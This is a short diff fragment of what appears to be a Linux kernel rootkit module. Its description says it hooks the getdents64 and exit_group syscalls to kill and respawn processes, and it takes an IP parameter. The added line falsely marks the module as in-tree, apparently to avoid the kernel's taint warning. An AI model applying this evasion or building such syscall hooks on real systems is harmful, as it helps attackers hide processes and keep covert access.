@@ -13,6 +13,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
 MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill our processes and respawn them");
+MODULE_INFO(intree, "Y");
 
 static char ip_param[KSYM_NAME_LEN] = "127.0.0.1";
 module_param_string(ip, ip_param, KSYM_NAME_LEN, 0644);
